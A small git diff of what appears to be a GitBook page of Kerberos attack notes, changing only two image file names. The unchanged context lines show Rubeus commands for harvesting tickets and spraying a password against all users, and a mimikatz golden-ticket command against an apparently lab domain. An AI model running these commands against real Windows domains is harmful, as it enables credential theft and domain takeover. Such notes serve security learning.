@@ -72,7 +72,7 @@ Download rubeus [here](https://github.com/GhostPack/Rubeus).
 
 `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds
 
-![](<../../.gitbook/assets/image (156).png>)
+![](<../../.gitbook/assets/image (156) (1).png>)
 
 `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user.
 
@@ -156,7 +156,7 @@ Generate golden ticket:
 
 **`Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:1103`**
 
-![](<../../.gitbook/assets/image (126).png>)
+![](<../../.gitbook/assets/image (126) (1).png>)
 
 ### Use the Golden/Silver Ticket to access other machines
 
